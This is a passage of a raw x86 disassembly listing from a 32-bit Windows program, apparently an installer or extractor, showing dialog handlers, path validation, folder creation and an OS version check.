  4031d0:	c7 05 90 85 40 00 01 	movl   $0x1,0x408590
  4031d7:	00 00 00 
  4031da:	33 c0                	xor    %eax,%eax
  4031dc:	5d                   	pop    %ebp
  4031dd:	c2 10 00             	ret    $0x10
  4031e0:	8b d1                	mov    %ecx,%edx
  4031e2:	56                   	push   %esi
  4031e3:	8d 72 01             	lea    0x1(%edx),%esi
  4031e6:	8a 02                	mov    (%edx),%al
  4031e8:	42                   	inc    %edx
  4031e9:	84 c0                	test   %al,%al
  4031eb:	75 f9                	jne    0x4031e6
  4031ed:	2b d6                	sub    %esi,%edx
  4031ef:	5e                   	pop    %esi
  4031f0:	83 fa 03             	cmp    $0x3,%edx
  4031f3:	73 03                	jae    0x4031f8
  4031f5:	33 c0                	xor    %eax,%eax
  4031f7:	c3                   	ret
  4031f8:	8a 41 01             	mov    0x1(%ecx),%al
  4031fb:	3c 3a                	cmp    $0x3a,%al
  4031fd:	74 09                	je     0x403208
  4031ff:	80 39 5c             	cmpb   $0x5c,(%ecx)
  403202:	75 f1                	jne    0x4031f5
  403204:	3c 5c                	cmp    $0x5c,%al
  403206:	75 ed                	jne    0x4031f5
  403208:	33 c0                	xor    %eax,%eax
  40320a:	40                   	inc    %eax
  40320b:	c3                   	ret
  40320c:	cc                   	int3
  40320d:	cc                   	int3
  40320e:	cc                   	int3
  40320f:	cc                   	int3
  403210:	8b ff                	mov    %edi,%edi
  403212:	55                   	push   %ebp
  403213:	8b ec                	mov    %esp,%ebp
  403215:	8b 45 0c             	mov    0xc(%ebp),%eax
  403218:	53                   	push   %ebx
  403219:	56                   	push   %esi
  40321a:	57                   	push   %edi
  40321b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40321e:	83 e8 10             	sub    $0x10,%eax
  403221:	0f 84 15 02 00 00    	je     0x40343c
  403227:	6a 01                	push   $0x1
  403229:	5b                   	pop    %ebx
  40322a:	2d 00 01 00 00       	sub    $0x100,%eax
  40322f:	0f 84 ad 01 00 00    	je     0x4033e2
  403235:	2b c3                	sub    %ebx,%eax
  403237:	74 07                	je     0x403240
  403239:	33 c0                	xor    %eax,%eax
  40323b:	e9 08 02 00 00       	jmp    0x403448
  403240:	8b 45 10             	mov    0x10(%ebp),%eax
  403243:	83 e8 01             	sub    $0x1,%eax
  403246:	0f 84 91 00 00 00    	je     0x4032dd
  40324c:	83 e8 01             	sub    $0x1,%eax
  40324f:	74 74                	je     0x4032c5
  403251:	2d 34 08 00 00       	sub    $0x834,%eax
  403256:	0f 85 dc 01 00 00    	jne    0x403438
  40325c:	68 00 02 00 00       	push   $0x200
  403261:	68 98 85 40 00       	push   $0x408598
  403266:	68 e8 03 00 00       	push   $0x3e8
  40326b:	ff 35 3c 9a 40 00    	push   0x409a3c
  403271:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403277:	85 c0                	test   %eax,%eax
  403279:	75 19                	jne    0x403294
  40327b:	ba b1 04 00 00       	mov    $0x4b1,%edx
  403280:	33 f6                	xor    %esi,%esi
  403282:	8b cf                	mov    %edi,%ecx
  403284:	56                   	push   %esi
  403285:	6a 10                	push   $0x10
  403287:	56                   	push   %esi
  403288:	56                   	push   %esi
  403289:	e8 2b 12 00 00       	call   0x4044b9
  40328e:	56                   	push   %esi
  40328f:	e9 aa 01 00 00       	jmp    0x40343e
  403294:	51                   	push   %ecx
  403295:	51                   	push   %ecx
  403296:	8b cf                	mov    %edi,%ecx
  403298:	e8 87 0f 00 00       	call   0x404224
  40329d:	85 c0                	test   %eax,%eax
  40329f:	0f 84 93 01 00 00    	je     0x403438
  4032a5:	68 a0 87 40 00       	push   $0x4087a0
  4032aa:	68 35 08 00 00       	push   $0x835
  4032af:	57                   	push   %edi
  4032b0:	ff 15 d4 a1 40 00    	call   *0x40a1d4
  4032b6:	85 c0                	test   %eax,%eax
  4032b8:	0f 85 7a 01 00 00    	jne    0x403438
  4032be:	ba c0 04 00 00       	mov    $0x4c0,%edx
  4032c3:	eb bb                	jmp    0x403280
  4032c5:	6a 00                	push   $0x0
  4032c7:	57                   	push   %edi
  4032c8:	ff 15 e0 a1 40 00    	call   *0x40a1e0
  4032ce:	c7 05 24 91 40 00 c7 	movl   $0x800704c7,0x409124
  4032d5:	04 07 80 
  4032d8:	e9 68 01 00 00       	jmp    0x403445
  4032dd:	68 04 01 00 00       	push   $0x104
  4032e2:	bb e4 91 40 00       	mov    $0x4091e4,%ebx
  4032e7:	53                   	push   %ebx
  4032e8:	68 35 08 00 00       	push   $0x835
  4032ed:	57                   	push   %edi
  4032ee:	ff 15 ac a1 40 00    	call   *0x40a1ac
  4032f4:	85 c0                	test   %eax,%eax
  4032f6:	0f 84 d8 00 00 00    	je     0x4033d4
  4032fc:	8b cb                	mov    %ebx,%ecx
  4032fe:	8d 51 01             	lea    0x1(%ecx),%edx
  403301:	8a 01                	mov    (%ecx),%al
  403303:	41                   	inc    %ecx
  403304:	84 c0                	test   %al,%al
  403306:	75 f9                	jne    0x403301
  403308:	2b ca                	sub    %edx,%ecx
  40330a:	83 f9 03             	cmp    $0x3,%ecx
  40330d:	0f 82 c1 00 00 00    	jb     0x4033d4
  403313:	a0 e5 91 40 00       	mov    0x4091e5,%al
  403318:	3c 3a                	cmp    $0x3a,%al
  40331a:	74 15                	je     0x403331
  40331c:	80 3d e4 91 40 00 5c 	cmpb   $0x5c,0x4091e4
  403323:	0f 85 ab 00 00 00    	jne    0x4033d4
  403329:	3c 5c                	cmp    $0x5c,%al
  40332b:	0f 85 a3 00 00 00    	jne    0x4033d4
  403331:	53                   	push   %ebx
  403332:	ff 15 70 a0 40 00    	call   *0x40a070
  403338:	33 f6                	xor    %esi,%esi
  40333a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40333d:	75 3d                	jne    0x40337c
  40333f:	6a 04                	push   $0x4
  403341:	6a 20                	push   $0x20
  403343:	56                   	push   %esi
  403344:	53                   	push   %ebx
  403345:	ba 4a 05 00 00       	mov    $0x54a,%edx
  40334a:	8b cf                	mov    %edi,%ecx
  40334c:	e8 68 11 00 00       	call   0x4044b9
  403351:	83 f8 06             	cmp    $0x6,%eax
  403354:	0f 85 db 00 00 00    	jne    0x403435
  40335a:	56                   	push   %esi
  40335b:	53                   	push   %ebx
  40335c:	ff 15 b4 a0 40 00    	call   *0x40a0b4
  403362:	85 c0                	test   %eax,%eax
  403364:	75 16                	jne    0x40337c
  403366:	56                   	push   %esi
  403367:	6a 10                	push   $0x10
  403369:	56                   	push   %esi
  40336a:	53                   	push   %ebx
  40336b:	ba cb 04 00 00       	mov    $0x4cb,%edx
  403370:	8b cf                	mov    %edi,%ecx
  403372:	e8 42 11 00 00       	call   0x4044b9
  403377:	e9 c9 00 00 00       	jmp    0x403445
  40337c:	68 40 11 40 00       	push   $0x401140
  403381:	ba 04 01 00 00       	mov    $0x104,%edx
  403386:	8b cb                	mov    %ebx,%ecx
  403388:	e8 fd 31 00 00       	call   0x40658a
  40338d:	8b cb                	mov    %ebx,%ecx
  40338f:	e8 34 25 00 00       	call   0x4058c8
  403394:	85 c0                	test   %eax,%eax
  403396:	75 0c                	jne    0x4033a4
  403398:	56                   	push   %esi
  403399:	6a 10                	push   $0x10
  40339b:	56                   	push   %esi
  40339c:	56                   	push   %esi
  40339d:	ba be 04 00 00       	mov    $0x4be,%edx
  4033a2:	eb cc                	jmp    0x403370
  4033a4:	80 3d e4 91 40 00 5c 	cmpb   $0x5c,0x4091e4
  4033ab:	75 09                	jne    0x4033b6
  4033ad:	80 3d e5 91 40 00 5c 	cmpb   $0x5c,0x4091e5
  4033b4:	74 11                	je     0x4033c7
  4033b6:	33 c0                	xor    %eax,%eax
  4033b8:	8b cb                	mov    %ebx,%ecx
  4033ba:	40                   	inc    %eax
  4033bb:	50                   	push   %eax
  4033bc:	8b d0                	mov    %eax,%edx
  4033be:	e8 ba 25 00 00       	call   0x40597d
  4033c3:	85 c0                	test   %eax,%eax
  4033c5:	74 6e                	je     0x403435
  4033c7:	33 db                	xor    %ebx,%ebx
  4033c9:	43                   	inc    %ebx
  4033ca:	53                   	push   %ebx
  4033cb:	57                   	push   %edi
  4033cc:	ff 15 e0 a1 40 00    	call   *0x40a1e0
  4033d2:	eb 64                	jmp    0x403438
  4033d4:	33 f6                	xor    %esi,%esi
  4033d6:	ba bf 04 00 00       	mov    $0x4bf,%edx
  4033db:	56                   	push   %esi
  4033dc:	6a 10                	push   $0x10
  4033de:	56                   	push   %esi
  4033df:	56                   	push   %esi
  4033e0:	eb 8e                	jmp    0x403370
  4033e2:	ff 15 cc a1 40 00    	call   *0x40a1cc
  4033e8:	8b d0                	mov    %eax,%edx
  4033ea:	8b cf                	mov    %edi,%ecx
  4033ec:	e8 df 0f 00 00       	call   0x4043d0
  4033f1:	68 54 91 40 00       	push   $0x409154
  4033f6:	57                   	push   %edi
  4033f7:	ff 15 10 a2 40 00    	call   *0x40a210
  4033fd:	33 f6                	xor    %esi,%esi
  4033ff:	56                   	push   %esi
  403400:	68 03 01 00 00       	push   $0x103
  403405:	68 c5 00 00 00       	push   $0xc5
  40340a:	68 35 08 00 00       	push   $0x835
  40340f:	57                   	push   %edi
  403410:	ff 15 08 a2 40 00    	call   *0x40a208
  403416:	66 39 1d 40 9a 40 00 	cmp    %bx,0x409a40
  40341d:	75 19                	jne    0x403438
  40341f:	56                   	push   %esi
  403420:	68 36 08 00 00       	push   $0x836
  403425:	57                   	push   %edi
  403426:	ff 15 00 a2 40 00    	call   *0x40a200
  40342c:	50                   	push   %eax
  40342d:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  403433:	eb 03                	jmp    0x403438
  403435:	33 db                	xor    %ebx,%ebx
  403437:	43                   	inc    %ebx
  403438:	8b c3                	mov    %ebx,%eax
  40343a:	eb 0c                	jmp    0x403448
  40343c:	6a 00                	push   $0x0
  40343e:	57                   	push   %edi
  40343f:	ff 15 e0 a1 40 00    	call   *0x40a1e0
  403445:	33 c0                	xor    %eax,%eax
  403447:	40                   	inc    %eax
  403448:	5f                   	pop    %edi
  403449:	5e                   	pop    %esi
  40344a:	5b                   	pop    %ebx
  40344b:	5d                   	pop    %ebp
  40344c:	c2 10 00             	ret    $0x10
  40344f:	cc                   	int3
  403450:	8b ff                	mov    %edi,%edi
  403452:	55                   	push   %ebp
  403453:	8b ec                	mov    %esp,%ebp
  403455:	8b 45 0c             	mov    0xc(%ebp),%eax
  403458:	56                   	push   %esi
  403459:	83 e8 10             	sub    $0x10,%eax
  40345c:	74 75                	je     0x4034d3
  40345e:	2d 00 01 00 00       	sub    $0x100,%eax
  403463:	74 35                	je     0x40349a
  403465:	83 e8 01             	sub    $0x1,%eax
  403468:	74 04                	je     0x40346e
  40346a:	33 c0                	xor    %eax,%eax
  40346c:	eb 73                	jmp    0x4034e1
  40346e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403471:	83 f9 06             	cmp    $0x6,%ecx
  403474:	72 68                	jb     0x4034de
  403476:	33 f6                	xor    %esi,%esi
  403478:	46                   	inc    %esi
  403479:	83 f9 07             	cmp    $0x7,%ecx
  40347c:	76 0e                	jbe    0x40348c
  40347e:	81 f9 39 08 00 00    	cmp    $0x839,%ecx
  403484:	75 58                	jne    0x4034de
  403486:	89 35 dc 91 40 00    	mov    %esi,0x4091dc
  40348c:	51                   	push   %ecx
  40348d:	ff 75 08             	push   0x8(%ebp)
  403490:	ff 15 e0 a1 40 00    	call   *0x40a1e0
  403496:	8b c6                	mov    %esi,%eax
  403498:	eb 47                	jmp    0x4034e1
  40349a:	ff 15 cc a1 40 00    	call   *0x40a1cc
  4034a0:	8b 75 08             	mov    0x8(%ebp),%esi
  4034a3:	8b d0                	mov    %eax,%edx
  4034a5:	8b ce                	mov    %esi,%ecx
  4034a7:	e8 24 0f 00 00       	call   0x4043d0
  4034ac:	68 54 91 40 00       	push   $0x409154
  4034b1:	56                   	push   %esi
  4034b2:	ff 15 10 a2 40 00    	call   *0x40a210
  4034b8:	ff 35 04 94 40 00    	push   0x409404
  4034be:	68 38 08 00 00       	push   $0x838
  4034c3:	56                   	push   %esi
  4034c4:	ff 15 d4 a1 40 00    	call   *0x40a1d4
  4034ca:	56                   	push   %esi
  4034cb:	ff 15 f8 a1 40 00    	call   *0x40a1f8
  4034d1:	eb 0b                	jmp    0x4034de
  4034d3:	6a 02                	push   $0x2
  4034d5:	ff 75 08             	push   0x8(%ebp)
  4034d8:	ff 15 e0 a1 40 00    	call   *0x40a1e0
  4034de:	33 c0                	xor    %eax,%eax
  4034e0:	40                   	inc    %eax
  4034e1:	5e                   	pop    %esi
  4034e2:	5d                   	pop    %ebp
  4034e3:	c2 10 00             	ret    $0x10
  4034e6:	cc                   	int3
  4034e7:	cc                   	int3
  4034e8:	cc                   	int3
  4034e9:	cc                   	int3
  4034ea:	cc                   	int3
  4034eb:	cc                   	int3
  4034ec:	cc                   	int3
  4034ed:	cc                   	int3
  4034ee:	cc                   	int3
  4034ef:	cc                   	int3
  4034f0:	8b ff                	mov    %edi,%edi
  4034f2:	55                   	push   %ebp
  4034f3:	8b ec                	mov    %esp,%ebp
  4034f5:	8b 45 0c             	mov    0xc(%ebp),%eax
  4034f8:	53                   	push   %ebx
  4034f9:	56                   	push   %esi
  4034fa:	57                   	push   %edi
  4034fb:	83 e8 10             	sub    $0x10,%eax
  4034fe:	0f 84 5f 01 00 00    	je     0x403663
  403504:	6a 01                	push   $0x1
  403506:	5e                   	pop    %esi
  403507:	2d f2 00 00 00       	sub    $0xf2,%eax
  40350c:	0f 84 49 01 00 00    	je     0x40365b
  403512:	83 e8 0e             	sub    $0xe,%eax
  403515:	0f 84 a3 00 00 00    	je     0x4035be
  40351b:	2b c6                	sub    %esi,%eax
  40351d:	74 30                	je     0x40354f
  40351f:	2d 90 0e 00 00       	sub    $0xe90,%eax
  403524:	74 07                	je     0x40352d
  403526:	33 c0                	xor    %eax,%eax
  403528:	e9 4c 01 00 00       	jmp    0x403679
  40352d:	6a 00                	push   $0x0
  40352f:	ff 35 9c 87 40 00    	push   0x40879c
  403535:	ff 15 10 a1 40 00    	call   *0x40a110
  40353b:	ff 75 10             	push   0x10(%ebp)
  40353e:	ff 75 08             	push   0x8(%ebp)
  403541:	ff 15 e0 a1 40 00    	call   *0x40a1e0
  403547:	33 c0                	xor    %eax,%eax
  403549:	40                   	inc    %eax
  40354a:	e9 2a 01 00 00       	jmp    0x403679
  40354f:	83 7d 10 02          	cmpl   $0x2,0x10(%ebp)
  403553:	0f 85 1e 01 00 00    	jne    0x403677
  403559:	ff 35 8c 85 40 00    	push   0x40858c
  40355f:	ff 15 24 a1 40 00    	call   *0x40a124
  403565:	8b 0d 84 85 40 00    	mov    0x408584,%ecx
  40356b:	33 ff                	xor    %edi,%edi
  40356d:	6a 04                	push   $0x4
  40356f:	6a 20                	push   $0x20
  403571:	57                   	push   %edi
  403572:	68 40 11 40 00       	push   $0x401140
  403577:	ba b2 04 00 00       	mov    $0x4b2,%edx
  40357c:	e8 38 0f 00 00       	call   0x4044b9
  403581:	83 f8 06             	cmp    $0x6,%eax
  403584:	74 15                	je     0x40359b
  403586:	3b c6                	cmp    %esi,%eax
  403588:	74 11                	je     0x40359b
  40358a:	ff 35 8c 85 40 00    	push   0x40858c
  403590:	ff 15 0c a1 40 00    	call   *0x40a10c
  403596:	e9 dc 00 00 00       	jmp    0x403677
  40359b:	ff 35 8c 85 40 00    	push   0x40858c
  4035a1:	89 35 d8 91 40 00    	mov    %esi,0x4091d8
  4035a7:	ff 15 0c a1 40 00    	call   *0x40a10c
  4035ad:	8b 0d 9c 87 40 00    	mov    0x40879c,%ecx
  4035b3:	e8 c8 00 00 00       	call   0x403680
  4035b8:	57                   	push   %edi
  4035b9:	e9 b0 00 00 00       	jmp    0x40366e
  4035be:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4035c1:	89 1d 84 85 40 00    	mov    %ebx,0x408584
  4035c7:	ff 15 cc a1 40 00    	call   *0x40a1cc
  4035cd:	8b d0                	mov    %eax,%edx
  4035cf:	8b cb                	mov    %ebx,%ecx
  4035d1:	e8 fa 0d 00 00       	call   0x4043d0
  4035d6:	33 ff                	xor    %edi,%edi
  4035d8:	39 3d 84 81 40 00    	cmp    %edi,0x408184
  4035de:	74 3d                	je     0x40361d
  4035e0:	68 b9 0b 00 00       	push   $0xbb9
  4035e5:	57                   	push   %edi
  4035e6:	68 64 04 00 00       	push   $0x464
  4035eb:	68 3b 08 00 00       	push   $0x83b
  4035f0:	53                   	push   %ebx
  4035f1:	ff 15 00 a2 40 00    	call   *0x40a200
  4035f7:	50                   	push   %eax
  4035f8:	ff 15 04 a2 40 00    	call   *0x40a204
  4035fe:	68 00 00 ff ff       	push   $0xffff0000
  403603:	6a ff                	push   $0xffffffff
  403605:	68 65 04 00 00       	push   $0x465
  40360a:	68 3b 08 00 00       	push   $0x83b
  40360f:	53                   	push   %ebx
  403610:	ff 15 00 a2 40 00    	call   *0x40a200
  403616:	50                   	push   %eax
  403617:	ff 15 04 a2 40 00    	call   *0x40a204
  40361d:	68 54 91 40 00       	push   $0x409154
  403622:	53                   	push   %ebx
  403623:	ff 15 10 a2 40 00    	call   *0x40a210
  403629:	68 98 87 40 00       	push   $0x408798
  40362e:	57                   	push   %edi
  40362f:	57                   	push   %edi
  403630:	68 e0 4f 40 00       	push   $0x404fe0
  403635:	57                   	push   %edi
  403636:	57                   	push   %edi
  403637:	ff 15 20 a1 40 00    	call   *0x40a120
  40363d:	a3 9c 87 40 00       	mov    %eax,0x40879c
  403642:	85 c0                	test   %eax,%eax
  403644:	75 31                	jne    0x403677
  403646:	57                   	push   %edi
  403647:	6a 10                	push   $0x10
  403649:	57                   	push   %edi
  40364a:	57                   	push   %edi
  40364b:	ba b8 04 00 00       	mov    $0x4b8,%edx
  403650:	8b cb                	mov    %ebx,%ecx
  403652:	e8 62 0e 00 00       	call   0x4044b9
  403657:	57                   	push   %edi
  403658:	53                   	push   %ebx
  403659:	eb 16                	jmp    0x403671
  40365b:	83 7d 10 1b          	cmpl   $0x1b,0x10(%ebp)
  40365f:	75 16                	jne    0x403677
  403661:	eb 03                	jmp    0x403666
  403663:	33 f6                	xor    %esi,%esi
  403665:	46                   	inc    %esi
  403666:	6a 00                	push   $0x0
  403668:	89 35 d8 91 40 00    	mov    %esi,0x4091d8
  40366e:	ff 75 08             	push   0x8(%ebp)
  403671:	ff 15 e0 a1 40 00    	call   *0x40a1e0
  403677:	8b c6                	mov    %esi,%eax
  403679:	5f                   	pop    %edi
  40367a:	5e                   	pop    %esi
  40367b:	5b                   	pop    %ebx
  40367c:	5d                   	pop    %ebp
  40367d:	c2 10 00             	ret    $0x10
  403680:	8b ff                	mov    %edi,%edi
  403682:	55                   	push   %ebp
  403683:	8b ec                	mov    %esp,%ebp
  403685:	83 ec 20             	sub    $0x20,%esp
  403688:	56                   	push   %esi
  403689:	57                   	push   %edi
  40368a:	33 ff                	xor    %edi,%edi
  40368c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40368f:	8b f7                	mov    %edi,%esi
  403691:	68 ff 04 00 00       	push   $0x4ff
  403696:	6a ff                	push   $0xffffffff
  403698:	57                   	push   %edi
  403699:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40369c:	50                   	push   %eax
  40369d:	6a 01                	push   $0x1
  40369f:	ff 15 b8 a1 40 00    	call   *0x40a1b8
  4036a5:	85 c0                	test   %eax,%eax
  4036a7:	74 3f                	je     0x4036e8
  4036a9:	6a 01                	push   $0x1
  4036ab:	57                   	push   %edi
  4036ac:	57                   	push   %edi
  4036ad:	57                   	push   %edi
  4036ae:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4036b1:	50                   	push   %eax
  4036b2:	ff 15 fc a1 40 00    	call   *0x40a1fc
  4036b8:	85 c0                	test   %eax,%eax
  4036ba:	74 d5                	je     0x403691
  4036bc:	83 7d e4 12          	cmpl   $0x12,-0x1c(%ebp)
  4036c0:	75 05                	jne    0x4036c7
  4036c2:	33 f6                	xor    %esi,%esi
  4036c4:	46                   	inc    %esi
  4036c5:	eb 0a                	jmp    0x4036d1
  4036c7:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4036ca:	50                   	push   %eax
  4036cb:	ff 15 c8 a1 40 00    	call   *0x40a1c8
  4036d1:	6a 01                	push   $0x1
  4036d3:	57                   	push   %edi
  4036d4:	57                   	push   %edi
  4036d5:	57                   	push   %edi
  4036d6:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4036d9:	50                   	push   %eax
  4036da:	ff 15 fc a1 40 00    	call   *0x40a1fc
  4036e0:	85 c0                	test   %eax,%eax
  4036e2:	75 d8                	jne    0x4036bc
  4036e4:	85 f6                	test   %esi,%esi
  4036e6:	74 a9                	je     0x403691
  4036e8:	5f                   	pop    %edi
  4036e9:	5e                   	pop    %esi
  4036ea:	8b e5                	mov    %ebp,%esp
  4036ec:	5d                   	pop    %ebp
  4036ed:	c3                   	ret
  4036ee:	8b ff                	mov    %edi,%edi
  4036f0:	55                   	push   %ebp
  4036f1:	8b ec                	mov    %esp,%ebp
  4036f3:	81 ec c4 01 00 00    	sub    $0x1c4,%esp
  4036f9:	a1 04 80 40 00       	mov    0x408004,%eax
  4036fe:	33 c5                	xor    %ebp,%eax
  403700:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403703:	53                   	push   %ebx
  403704:	56                   	push   %esi
  403705:	57                   	push   %edi
  403706:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  40370c:	c7 85 64 fe ff ff 94 	movl   $0x94,-0x19c(%ebp)
  403713:	00 00 00 
  403716:	8b d9                	mov    %ecx,%ebx
  403718:	33 ff                	xor    %edi,%edi
  40371a:	50                   	push   %eax
  40371b:	89 9d 54 fe ff ff    	mov    %ebx,-0x1ac(%ebp)
  403721:	8b f7                	mov    %edi,%esi
  403723:	ff 15 14 a1 40 00    	call   *0x40a114
  403729:	85 c0                	test   %eax,%eax
  40372b:	75 0a                	jne    0x403737
  40372d:	be b4 04 00 00       	mov    $0x4b4,%esi
  403732:	e9 34 02 00 00       	jmp    0x40396b
  403737:	8b 85 74 fe ff ff    	mov    -0x18c(%ebp),%eax
  40373d:	8b 95 68 fe ff ff    	mov    -0x198(%ebp),%edx
  403743:	6a 02                	push   $0x2
  403745:	59                   	pop    %ecx
  403746:	83 e8 01             	sub    $0x1,%eax
  403749:	74 5e                	je     0x4037a9
  40374b:	83 e8 01             	sub    $0x1,%eax
  40374e:	74 0a                	je     0x40375a
  403750:	be ca 04 00 00       	mov    $0x4ca,%esi
  403755:	e9 11 02 00 00       	jmp    0x40396b
  40375a:	33 c0                	xor    %eax,%eax
  40375c:	66 89 0d 40 9a 40 00 	mov    %cx,0x409a40
  403763:	40                   	inc    %eax
  403764:	a3 84 81 40 00       	mov    %eax,0x408184
  403769:	a3 80 81 40 00       	mov    %eax,0x408180
  40376e:	83 fa 03             	cmp    $0x3,%edx
  403771:	77 29                	ja     0x40379c
  403773:	8b c8                	mov    %eax,%ecx
  403775:	6a 03                	push   $0x3
  403777:	58                   	pop    %eax
  403778:	66 89 0d 40 9a 40 00 	mov    %cx,0x409a40
  40377f:	3b d0                	cmp    %eax,%edx
  403781:	72 0b                	jb     0x40378e
  403783:	75 3a                	jne    0x4037bf
  403785:	83 bd 6c fe ff ff 33 	cmpl   $0x33,-0x194(%ebp)
  40378c:	73 31                	jae    0x4037bf
  40378e:	89 3d 84 81 40 00    	mov    %edi,0x408184
  403794:	89 3d 80 81 40 00    	mov    %edi,0x408180
  40379a:	eb 23                	jmp    0x4037bf
  40379c:	83 fa 05             	cmp    $0x5,%edx
  40379f:	72 1e                	jb     0x4037bf
  4037a1:	6a 03                	push   $0x3
  4037a3:	58                   	pop    %eax
  4037a4:	66 8b c8             	mov    %ax,%cx
  4037a7:	eb 0f                	jmp    0x4037b8
  4037a9:	33 c0                	xor    %eax,%eax
  4037ab:	33 c9                	xor    %ecx,%ecx
  4037ad:	40                   	inc    %eax
  4037ae:	a3 84 81 40 00       	mov    %eax,0x408184
  4037b3:	a3 80 81 40 00       	mov    %eax,0x408180
  4037b8:	66 89 0d 40 9a 40 00 	mov    %cx,0x409a40
  4037bf:	39 35 34 8a 40 00    	cmp    %esi,0x408a34
  4037c5:	0f 85 5c 02 00 00    	jne    0x403a27
  4037cb:	85 db                	test   %ebx,%ebx
  4037cd:	0f 84 54 02 00 00    	je     0x403a27
  4037d3:	33 c0                	xor    %eax,%eax
  4037d5:	89 bd 58 fe ff ff    	mov    %edi,-0x1a8(%ebp)
  4037db:	66 85 c9             	test   %cx,%cx
  4037de:	0f 95 c0             	setne  %al
  4037e1:	48                   	dec    %eax
  4037e2:	83 e0 3c             	and    $0x3c,%eax
  4037e5:	83 c0 04             	add    $0x4,%eax
  4037e8:	03 d8                	add    %eax,%ebx
  4037ea:	21 b5 60 fe ff ff    	and    %esi,-0x1a0(%ebp)
  4037f0:	89 9d 4c fe ff ff    	mov    %ebx,-0x1b4(%ebp)
  4037f6:	8b 95 6c fe ff ff    	mov    -0x194(%ebp),%edx
  4037fc:	8b 8d 68 fe ff ff    	mov    -0x198(%ebp),%ecx
  403802:	6b c7 18             	imul   $0x18,%edi,%eax
  403805:	89 85 5c fe ff ff    	mov    %eax,-0x1a4(%ebp)
  40380b:	ff 74 18 04          	push   0x4(%eax,%ebx,1)
  40380f:	ff 34 18             	push   (%eax,%ebx,1)
  403812:	e8 72 f2 ff ff       	call   0x402a89
  403817:	89 85 50 fe ff ff    	mov    %eax,-0x1b0(%ebp)
  40381d:	8b 85 5c fe ff ff    	mov    -0x1a4(%ebp),%eax
  403823:	ff 74 18 10          	push   0x10(%eax,%ebx,1)
  403827:	ff 74 18 0c          	push   0xc(%eax,%ebx,1)
  40382b:	e8 59 f2 ff ff       	call   0x402a89
  403830:	8b 8d 50 fe ff ff    	mov    -0x1b0(%ebp),%ecx
  403836:	ba 4d 05 00 00       	mov    $0x54d,%edx
  40383b:	85 c9                	test   %ecx,%ecx
  40383d:	0f 88 a8 00 00 00    	js     0x4038eb
  403843:	85 c0                	test   %eax,%eax
  403845:	0f 8f a0 00 00 00    	jg     0x4038eb
  40384b:	85 c9                	test   %ecx,%ecx
  40384d:	75 34                	jne    0x403883
  40384f:	85 c0                	test   %eax,%eax
  403851:	8b 85 70 fe ff ff    	mov    -0x190(%ebp),%eax
  403857:	75 15                	jne    0x40386e
  403859:	0f b7 c8             	movzwl %ax,%ecx
  40385c:	8b 85 5c fe ff ff    	mov    -0x1a4(%ebp),%eax
  403862:	3b 4c 18 08          	cmp    0x8(%eax,%ebx,1),%ecx
  403866:	72 38                	jb     0x4038a0
  403868:	3b 4c 18 14          	cmp    0x14(%eax,%ebx,1),%ecx
  40386c:	eb 30                	jmp    0x40389e
  40386e:	8b 8d 5c fe ff ff    	mov    -0x1a4(%ebp),%ecx
  403874:	0f b7 c0             	movzwl %ax,%eax
  403877:	3b 44 19 08          	cmp    0x8(%ecx,%ebx,1),%eax
  40387b:	0f 83 94 00 00 00    	jae    0x403915
  403881:	eb 1d                	jmp    0x4038a0
  403883:	85 c0                	test   %eax,%eax
  403885:	0f 85 8a 00 00 00    	jne    0x403915
  40388b:	8b 8d 5c fe ff ff    	mov    -0x1a4(%ebp),%ecx
  403891:	8b 85 70 fe ff ff    	mov    -0x190(%ebp),%eax
  403897:	0f b7 c0             	movzwl %ax,%eax
  40389a:	3b 44 19 14          	cmp    0x14(%ecx,%ebx,1),%eax
  40389e:	76 75                	jbe    0x403915
  4038a0:	85 ff                	test   %edi,%edi
  4038a2:	74 50                	je     0x4038f4
  4038a4:	be 4c 05 00 00       	mov    $0x54c,%esi
  4038a9:	83 a5 60 fe ff ff 00 	andl   $0x0,-0x1a0(%ebp)
  4038b0:	33 db                	xor    %ebx,%ebx
  4038b2:	83 a5 50 fe ff ff 00 	andl   $0x0,-0x1b0(%ebp)
  4038b9:	3b f2                	cmp    %edx,%esi
  4038bb:	8b 95 54 fe ff ff    	mov    -0x1ac(%ebp),%edx
  4038c1:	0f 85 ae 00 00 00    	jne    0x403975
  4038c7:	8b 8a 80 00 00 00    	mov    0x80(%edx),%ecx
  4038cd:	6b c7 3c             	imul   $0x3c,%edi,%eax
  4038d0:	81 c1 84 00 00 00    	add    $0x84,%ecx
  4038d6:	03 c8                	add    %eax,%ecx
  4038d8:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4038de:	03 ca                	add    %edx,%ecx
  4038e0:	89 85 60 fe ff ff    	mov    %eax,-0x1a0(%ebp)
  4038e6:	e9 90 00 00 00       	jmp    0x40397b
  4038eb:	83 bd 60 fe ff ff 01 	cmpl   $0x1,-0x1a0(%ebp)
  4038f2:	74 18                	je     0x40390c
  4038f4:	47                   	inc    %edi
  4038f5:	89 bd 58 fe ff ff    	mov    %edi,-0x1a8(%ebp)
  4038fb:	89 bd 60 fe ff ff    	mov    %edi,-0x1a0(%ebp)
  403901:	83 ff 02             	cmp    $0x2,%edi
  403904:	0f 8c ec fe ff ff    	jl     0x4037f6
  40390a:	eb 05                	jmp    0x403911
  40390c:	be 4c 05 00 00       	mov    $0x54c,%esi
  403911:	85 f6                	test   %esi,%esi
  403913:	75 38                	jne    0x40394d
  403915:	8b 8d 54 fe ff ff    	mov    -0x1ac(%ebp),%ecx
  40391b:	83 79 7c 00          	cmpl   $0x0,0x7c(%ecx)
  40391f:	0f 84 02 01 00 00    	je     0x403a27
  403925:	8d 85 58 fe ff ff    	lea    -0x1a8(%ebp),%eax
  40392b:	50                   	push   %eax
  40392c:	51                   	push   %ecx
  40392d:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  403933:	e8 b0 ef ff ff       	call   0x4028e8
  403938:	85 c0                	test   %eax,%eax
